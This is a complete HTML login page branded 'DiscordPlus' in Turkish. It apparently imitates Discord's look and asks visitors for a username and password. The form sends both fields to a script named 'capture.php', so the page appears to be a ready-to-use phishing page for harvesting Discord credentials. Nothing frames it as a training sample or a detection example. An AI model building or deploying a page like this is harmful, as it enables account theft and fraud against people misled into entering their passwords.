<!DOCTYPE html>
<html>
<head><title>DiscordPlus</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#fff;border-radius:12px;padding:40px 32px;width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.3);text-align:center;}
.card h1{color:#5865f2;margin-bottom:8px;font-size:28px;}
.card p{color:#666;margin-bottom:24px;font-size:14px;}
input{width:100%;padding:12px 14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;outline:none;transition:0.2s;}
input:focus{border-color:#5865f2;}
button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s;margin-top:8px;}
button:hover{background:#4752c4;}
</style></head>
<body>
<div class="card">
<h1>DiscordPlus</h1>
<p>Hesabına giriş yap</p>
<form action="capture.php" method="POST">
<input type="text" name="username" placeholder="Kullanıcı adı" required>
<input type="password" name="password" placeholder="Şifre" required>
<button type="submit">Giriş Yap</button>
</form>
</div>
</body>
</html>
